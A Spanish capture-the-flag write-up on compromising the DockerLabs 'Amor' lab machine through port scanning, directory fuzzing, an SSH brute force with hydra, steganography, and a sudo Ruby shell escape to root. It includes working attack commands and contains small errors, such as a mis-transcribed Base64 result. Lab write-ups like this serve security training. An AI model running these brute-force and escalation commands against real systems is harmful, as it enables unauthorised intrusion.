# 📄 Informe Técnico – Máquina Vulnerable **Amor** (DockerLabs)

**Nivel:** Fácil

**Autor:** AlejandroSL

**Fecha:** 10/05/2025

   ![](/Amor/Imagenes/Logo.png)

---

## 📌 Objetivo

Acceder a la máquina vulnerable **Amor**, identificar los servicios expuestos, obtener acceso mediante explotación remota y realizar escalada de privilegios hasta obtener acceso como **root**.

---

## 🔧 Despliegue de la máquina

1. Descargamos la máquina desde DockerLabs y la descomprimimos:

   ```bash
   unzip amor.zip
   sudo bash auto_deploy.sh amor.tar
   ```

   ![](/Amor/Imagenes/Despliegue.jpeg)

2. Verificamos la conectividad mediante `ping`:

   ```bash
   ping -c1 172.17.0.2
   ```

   ![](/Amor/Imagenes/Ping.jpeg)

---

## 🔍 Escaneo de Puertos

1. Escaneo rápido de puertos abiertos:

   ```bash
   sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
   ```

   Resultado: Puertos **22 (SSH)** y **80 (HTTP)** abiertos.
   ![](/Amor/Imagenes/Puerto.jpeg)

2. Extracción de puertos desde el archivo generado:

   ```bash
   extractPorts allPorts.txt
   ```

3. Escaneo profundo con scripts y detección de versiones:

   ```bash
   nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
   ```

   ![](/Amor/Imagenes/Servicios.jpeg)

---

## 🌐 Enumeración Web

Accedimos a la web en `http://172.17.0.2` y observamos varias notificaciones que revelaban nombres de usuarios: **Juan** y **Carlota**.
![](/Amor/Imagenes/Pagina.jpeg)

---

## 🪓 Fuzzing de directorios

Usamos `gobuster` para buscar directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2/javascript/jquery/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 20 -add-slash -b 403,404 -x php,html,txt
```

Resultado: Se encontró el directorio **/javascript/jquery/jquery**
![](/Amor/Imagenes/Gobuster.jpeg)
![](/Amor/Imagenes/Gobusterdir.jpeg)

---

## 🔐 Fuerza Bruta SSH

Se intentaron múltiples combinaciones de usuarios. Finalmente, usando `hydra` se logró acceder al servicio **SSH** como el usuario **carlota**:

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Credenciales válidas:

* **Usuario:** carlota
* **Contraseña:** babygirl
  ![](/Amor/Imagenes/Hydra.jpeg)

---

## 🖥️ Acceso a la máquina

Ingresamos exitosamente mediante SSH:

```bash
ssh carlota@172.17.0.2
```

![](/Amor/Imagenes/SSH.jpeg)

---

## 🕵️ Revisión de archivos y análisis de imagen

Dentro del directorio `/home/carlota/Desktop/fotos/vacaciones/` encontramos un archivo `imagen.jpg`. Lo transferimos a nuestra máquina con un servidor web:

En la máquina vulnerable:

```bash
python3 -m http.server 8080
```

En nuestra máquina atacante:

```bash
wget http://172.17.0.2:8080/imagen.jpg
```

![](/Amor/Imagenes/Descarga.jpeg)

Revisamos los metadatos de la imagen:

```bash
exiftool imagen.jpg
```

![](/Amor/Imagenes/Metadatos.jpeg)

---

## 🧪 Esteganografía y Decodificación

Usamos `steghide` para extraer información oculta en la imagen:

```bash
steghide extract -sf imagen.jpg
```

> No se solicitó contraseña (se presionó Enter).

Se extrajo un archivo `secret.txt` que contenía una cadena en **Base64**. La decodificamos:

```bash
echo 'c2VzbGFjYXNhZGVwaW55cG9u' | base64 -d > script.sh
cat script.sh
```

Contenido extraído:
**eslacasadepinypon**
![](/Amor/Imagenes/datos.jpe)

---

## 🧨 Escalada de Privilegios

Ejecutamos `sudo -l` para ver los comandos disponibles con permisos de **sudo**:

```bash
sudo -l
```

Se nos permite ejecutar este comando **sin contraseña**:

```bash
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

Esto nos da una **shell como root**:

```bash
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

![](/Amor/Imagenes/root.jpeg)

---

## ✅ Conclusión

* Se identificaron servicios clave mediante escaneo de puertos.
* Se encontraron usuarios desde la web y se obtuvo acceso por fuerza bruta SSH.
* Se analizó una imagen que contenía una cadena Base64 con una palabra clave importante.
* Finalmente, se logró escalar privilegios a **root** explotando permisos `sudo` sobre un binario seguro mal configurado.
